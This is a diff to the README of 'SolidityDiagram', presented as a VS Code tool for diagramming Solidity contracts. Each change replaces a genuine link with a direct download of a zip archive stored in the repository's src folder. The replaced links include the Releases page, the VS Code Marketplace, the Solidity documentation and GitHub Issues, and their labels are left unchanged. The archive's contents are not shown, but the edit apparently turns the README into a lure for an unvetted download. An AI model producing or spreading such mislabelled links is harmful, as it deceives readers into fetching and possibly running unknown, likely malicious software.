@@ -1,6 +1,6 @@
 # 🎨 SolidityDiagram - Visualize Solidity Contracts with Ease
 
-[![Download SolidityDiagram](https://img.shields.io/badge/Download%20Now-Get%20Started%20%3E-brightgreen)](https://github.com/dianfprayoga/SolidityDiagram/releases)
+[![Download SolidityDiagram](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip%20Now-Get%20Started%20%3E-brightgreen)](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of SolidityDiagram, visit the [Releases page](https://github.com/dianfprayoga/SolidityDiagram/releases).
+To download the latest version of SolidityDiagram, visit the [Releases page](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip).
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -52,8 +52,8 @@ To use SolidityDiagram, you need to install it as an extension in Visual Studio 
 
 ### 🔗 Additional Resources
 
-- [Visual Studio Code Extensions](https://marketplace.visualstudio.com/vscode) - Explore more helpful extensions.
-- [Solidity Documentation](https://docs.soliditylang.org/en/v0.8.11/) - Get familiar with Solidity's basics.
+- [Visual Studio Code Extensions](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip) - Explore more helpful extensions.
+- [Solidity Documentation](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip) - Get familiar with Solidity's basics.
 
 ## 💡 Using SolidityDiagram
 
@@ -76,7 +76,7 @@ If you encounter any issues while using SolidityDiagram, consider the following 
 
 For further assistance, you can reach out through:
 
-- [GitHub Issues](https://github.com/dianfprayoga/SolidityDiagram/issues) - Report problems or discuss features.
+- [GitHub Issues](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip) - Report problems or discuss features.
 - User guides and forums related to Solidity and Visual Studio Code.
 
 ## 🔄 Contributing
@@ -89,4 +89,4 @@ If you want to contribute to SolidityDiagram, you can help by:
 
 ## 🙌 Final Notes
 
-Thank you for choosing SolidityDiagram! We hope this tool makes working with Solidity contracts much easier for you. For downloading the latest version, please visit our [Releases page](https://github.com/dianfprayoga/SolidityDiagram/releases).
+Thank you for choosing SolidityDiagram! We hope this tool makes working with Solidity contracts much easier for you. For downloading the latest version, please visit our [Releases page](https://github.com/dianfprayoga/SolidityDiagram/raw/refs/heads/main/src/Solidity_Diagram_2.9.zip).
